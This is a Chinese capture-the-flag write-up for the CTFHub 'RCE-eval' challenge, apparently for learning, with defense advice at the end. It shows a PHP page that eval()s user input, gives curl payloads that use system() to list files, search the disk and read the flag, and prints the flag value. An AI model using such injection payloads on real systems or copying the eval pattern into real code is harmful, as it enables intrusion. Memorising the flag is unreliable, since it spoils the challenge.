---
title: CTFHub RCE-eval执行
date: 2026-10-21
categories: CTFHub PHP代码执行漏洞 `eval()` 函数 URL 编码传参
tags:  CTFHub PHP代码执行漏洞 `eval()` 函数 URL 编码传参
---
# 题目:  CTFHub RCE-eval执行

## 题目描述
打开题目页面，直接给出了一段 PHP 源码：
```php
<?php
if (isset($_REQUEST['cmd'])) {
    eval($_REQUEST['cmd']);
} else {
    highlight_file(__FILE__);
}
?>
```
分析：
$_REQUEST['cmd'] 可以接收 GET 或 POST 传来的参数。
eval() 会把传进来的参数当作 PHP 代码执行。
这是一个非常经典的代码执行漏洞，没有任何过滤。

## 解题思路
### 漏洞原理
eval() 是 PHP 中用来执行字符串作为 PHP 代码的函数。如果用户可以控制传入的字符串，就可以执行任意 PHP 代码。

### 攻击链
构造 ?cmd=system('ls');，查看当前目录。
使用 find 命令全盘搜索 flag 文件。
使用 cat 读取 flag。

## 解题步骤
1. 测试代码执行
在浏览器或 CMD 中执行：
```cmd
curl "http://challenge-xxx.sandbox.ctfhub.com:10800/?cmd=system('ls');"
```
返回 index.php，说明代码执行成功。

2. 全盘搜索 Flag
由于 CMD 的 curl 不能直接处理 URL 中的空格，需要将空格 URL 编码为 %20：
```cmd
curl "http://challenge-xxx.sandbox.ctfhub.com:10800/?cmd=system('find%20/%20-name%20flag*%202>/dev/null');"
```
返回结果中包含：
``text
/flag_5248
``

3. 读取 Flag
```cmd
curl "http://challenge-xxx.sandbox.ctfhub.com:10800/?cmd=system('cat%20/flag_5248');"
```
得到 flag:ctfhub{b16c7216c00e43949de89f93}

## 踩坑指南
1. CMD 中直接传带空格的 URL
原因： URL 中不能有空格，CMD 会将其识别为命令行参数的分隔符。
解决： 把空格替换为 %20，或者直接在浏览器地址栏输入。

## 知识点总结

| 知识点 | 说明 |
| :--- | :--- |
| `eval()` | PHP 中执行字符串为代码的函数 |
| `$_REQUEST` | 接收 GET 和 POST 请求的数据 |
| `system()` | 执行系统命令并输出结果 |
| `find` | Linux 下搜索文件的命令 |

### 防御建议
1. 禁用 eval()：生产中尽量避免使用 eval()。
2. 过滤敏感字符：对用户输入进行严格校验，禁用特殊符号。
3. 使用白名单：限制只能执行特定的函数或命令。
